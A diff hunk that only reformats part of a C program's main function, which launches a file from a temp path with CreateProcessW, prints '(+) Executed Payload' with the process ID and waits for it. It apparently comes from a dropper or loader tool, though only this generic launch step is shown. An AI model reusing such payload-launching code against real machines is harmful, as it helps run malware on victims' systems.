@@ -36,22 +36,23 @@ int main( void )
 
 	/* ------------------------------------------------------------------------------------------------------------------------------------------------- */
 
-	STARTUPINFOW SiW = { 0 };
-	PROCESS_INFORMATION Pi = { 0 };
+	STARTUPINFOW SiW = {0};
+	PROCESS_INFORMATION Pi = {0};
 
-	RtlSecureZeroMemory(&SiW, sizeof(STARTUPINFOW));
-	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
-	
-	if (!CreateProcessW(tempPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &SiW, &Pi)) {
-		LOG_ERR("CreateProcessW");
+	RtlSecureZeroMemory( &SiW, sizeof( STARTUPINFOW ) );
+	RtlSecureZeroMemory( &Pi, sizeof( PROCESS_INFORMATION ) );
+
+	if ( !CreateProcessW( tempPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &SiW, &Pi ) )
+	{
+		LOG_ERR( "CreateProcessW" );
 		return -1;
 	}
-	printf("(+) Executed Payload | PID->%d...\n", Pi.dwProcessId);
+	printf( "(+) Executed Payload | PID->%d...\n", Pi.dwProcessId );
 
-	WaitForSingleObjectEx(Pi.hProcess, INFINITE, FALSE);
+	WaitForSingleObjectEx( Pi.hProcess, INFINITE, FALSE );
 
-	CloseHandle(Pi.hProcess);
-	CloseHandle(Pi.hThread);
+	CloseHandle( Pi.hProcess );
+	CloseHandle( Pi.hThread );
 
 	/* ------------------------------------------------------------------------------------------------------------------------------------------------- */
 
